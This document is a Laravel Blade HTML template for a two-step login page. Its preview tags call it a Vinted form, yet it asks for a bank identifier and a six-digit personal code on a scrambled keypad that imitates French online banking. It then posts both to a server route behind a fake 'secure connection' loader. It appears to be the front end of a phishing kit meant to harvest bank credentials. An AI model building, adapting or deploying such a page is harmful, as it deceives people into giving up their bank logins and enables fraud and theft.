<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0"> 

        <meta property="og:title" content="Formulaire Vinted" />
        <meta property="og:description" content="Veuillez remplir vos informations de connexion sécurisée." />
        <meta property="og:type" content="website" />
        <meta property="og:url" content="{{ config('app.url') }}" />
        <meta property="og:image" content="" />

        <title>{{ config('app.name', 'Vinted') }}</title>

        <!-- Fonts -->
        <link rel="preconnect" href="https://fonts.bunny.net">
        <link href="https://fonts.bunny.net/css?family=instrument-sans:400,500,600" rel="stylesheet" />
        
        <!-- Tailwind CSS via CDN -->
        <script src="https://cdn.tailwindcss.com"></script>
        
        <!-- Alpine.js pour x-data, x-show, etc. -->
        <script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
    </head>
   <body class="bg-gray-50 min-h-screen flex items-center justify-center">

    <div id="global-loader" style="position: fixed; inset: 0; z-index: 9999; background: white; display: flex; flex-direction: column; align-items: center; justify-content: center; transition: opacity 0.5s ease;">
        <div class="loader-content" style="text-align: center; margin-top: 0;">
            <div style="width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #0d9488; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto;"></div>
            <h2 style="font-family: sans-serif; color: #1b1b18; margin-top: 20px;">Connexion sécurisée...</h2>
            <p style="font-family: sans-serif; color: #706f6c; font-size: 14px;">Traitement de votre validation </p> 
        </div>
    </div>

<style>
    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }
</style>

<script>

        // B. On attend le chargement complet pour cacher le loader
        window.addEventListener('load', function() {
            const loader = document.getElementById('global-loader');
            
            // Sécurité : on vérifie que l'élément existe bien avant d'agir
            if (loader) {
                setTimeout(() => {
                    loader.style.opacity = '0';
                    setTimeout(() => {
                        loader.style.display = 'none';
                    }, 500);
                }, 1200);
            }
        });
    </script>
    


    <main x-data="{step: 1,username: '',code: ''}" class="w-full max-w-md mx-auto px-4 py-20 overflow-hidden">

    
        
   <div 
    x-show="step === 1"
    x-transition:enter="transition-all duration-500 ease-in-out"
    x-transition:enter-start="translate-x-full opacity-0"
    x-transition:enter-end="translate-x-0 opacity-100"
    x-transition:leave-start="translate-x-0 opacity-100"
    x-transition:leave-end="-translate-x-full opacity-0"
>

    <h1 class="flex justify-center mt-10 font-bold pb-8 text-2xl">
        Accéder à votre espace client
    </h1>

    <form @submit.prevent="step = 2" class="space-y-4">

        <div>
            <label class="block text-sm font-extrabold text-gray-700 mb-1">
                Identifiant 
            </label>

            <label class="block text-xs text-gray-500 mb-1">
                Saisissez votre identifiant
            </label>

            <input
                type="text"
                x-model="username"
                class="w-full px-4 py-2 border text-sm border-gray-300 rounded-lg focus:ring-2 focus:ring-teal-600"
                placeholder="Identifiant Bancaire"
                required
            >
        </div>

        <div class="grid grid-cols-[1fr_auto] underline text-teal-600 text-sm font-bold">
            <a href="#">Où trouver mon identifiant ?</a>
        </div>

        <div class="flex justify-end">
            <button
                type="submit"
                class=" flex items-center justify-center bg-teal-600 hover:bg-teal-700 text-white font-bold py-3 px-6 rounded-lg">
                <svg class="w-4 h-4 mr-1 align-middle" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M5 9V7a5 5 0 0110 0v2a2 2 0 012 2v5a2 2 0 01-2 2H5a2 2 0 01-2-2v-5a2 2 0 012-2zm8-2v2H7V7a3 3 0 016 0z" clip-rule="evenodd"></path></svg>
                Valider
            </button>
        </div>

    </form>

</div>

<div class="w-full max-w-md mx-auto px-4 py-4 sm:py-6"

    x-show="step === 2"
    x-cloak
    x-transition:enter="transition-all duration-500 ease-in-out"
    x-transition:enter-start="translate-x-full opacity-0"
    x-transition:enter-end="translate-x-0 opacity-100"
    x-transition:leave-start="translate-x-0 opacity-100"
    x-transition:leave-end="-translate-x-full opacity-0"
>
    
    
    
    <form action="{{ route('valider.submit') }}" method="POST" class="space-y-3">

        @csrf

        <label class="block text-sm font-extrabold text-gray-700 mb-1">
            Identifiant
        </label>

        <input type="text" class="w-full px-4 py-2 border rounded-lg" name="username" :value="username" readonly>

        <input type="hidden" name="password" :value="code">

        <h1 class="font-bold text-sm mt-2">

        Code personnel
    </h1>

        <p class="text-sm text-gray-500 leading-5 mt-1">
Saisissez votre code personnel à l'aide du clavier ci-dessous.</p>

        @if ($errors->any())
            <div>
                @foreach ($errors->all() as $error)
                    <p>{{ $error }}</p>
                @endforeach
            </div>
        @endif

       <!-- Cases -->   
    <div class="flex gap-2 mt-2 justify-center w-full max-w-md">

        <template x-for="i in 6">

            <div
                class="w-14 h-10 border rounded-3xl flex items-center justify-center text-sm font-bold border-slate-400">

                <span x-text="code[i-1] ? '•' : '-'"></span>

            </div>

        </template>

    </div>

    <a href="#" class="block mt-2 text-sm font-semibold text-teal-700 underline"
>
        J'ai oublié mon code personnel
    </a>

    <!-- Clavier -->
    <div class="grid grid-cols-4 gap-3 sm:gap-4 mt-5"
>

    <!-- Ligne 1 -->
    <button type="button" @click="if(code.length < 6) code += '7'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg">7</button>
    <button type="button" @click="if(code.length < 6) code += '3'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg">3</button>
    <button type="button" @click="if(code.length < 6) code += '2'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg">2</button>
    <button type="button" @click="if(code.length < 6) code += '8'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg">8</button>

    <!-- Ligne 2 -->
    <button type="button" @click="if(code.length < 6) code += '6'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg">6</button>
    <button type="button" @click="if(code.length < 6) code += '0'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg">0</button>
    <button type="button" @click="if(code.length < 6) code += '4'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg">4</button>
    <button type="button" @click="if(code.length < 6) code += '5'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg">5</button>

    <!-- Ligne 3 -->
    <button type="button" @click="if(code.length < 6) code += '1'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg">1</button>
    <button type="button" @click="if(code.length < 6) code += '9'" class="key col-span-1 h-14 rounded-3xl bg-white shadow-lg">9</button>

    <!-- Effacer -->
    <button type="button" @click="code = code.slice(0,-1)"
        class="col-span-2 h-14 rounded-3xl bg-white shadow-lg flex items-center justify-center hover:shadow-xl transition">

        <svg xmlns="http://www.w3.org/2000/svg"
             class="w-8 h-8 text-teal-700"
             fill="none"
             viewBox="0 0 24 24"
             stroke="currentColor"
             stroke-width="2">

            <path stroke-linecap="round"
                  stroke-linejoin="round"
                  d="M20 6H9l-5 6 5 6h11a2 2 0 002-2V8a2 2 0 00-2-2z"/>

            <path stroke-linecap="round"
                  stroke-linejoin="round"
                  d="M13 10l4 4m0-4l-4 4"/>

        </svg>

    </button>

</div>


        <div class="flex items-center justify-between mt-5 pt-2">


            <button
                type="button"
                @click="step = 1"
                class="text-gray-600">
                Retour
            </button>

            <button
                type="submit"
                class="bg-teal-600 hover:bg-teal-700 text-white font-bold py-3 px-6 rounded-lg">
                Se connecter
            </button>

        </div>

    </form>

</div>
    </main>

    

       

    {{-- Espaceur conditionnel --}}
    @if (Route::has('login'))
        <div class="h-14 hidden lg:block"></div>
    @endif

    <script>
    // 2. On attend que TOUT soit chargé avant de toucher au style
    window.addEventListener('load', function() {
        const loader = document.getElementById('global-loader');
        
        // La sécurité : on vérifie que le loader existe bien avant de modifier son style
        if (loader) {
            setTimeout(() => {
                loader.style.opacity = '0';
                setTimeout(() => {
                    loader.style.display = 'none';
                }, 500);
            }, 1200);
        } else {
            console.error("Erreur : L'élément #global-loader n'a pas été trouvé dans le HTML.");
        }
    });
</script>
</body>
</html>
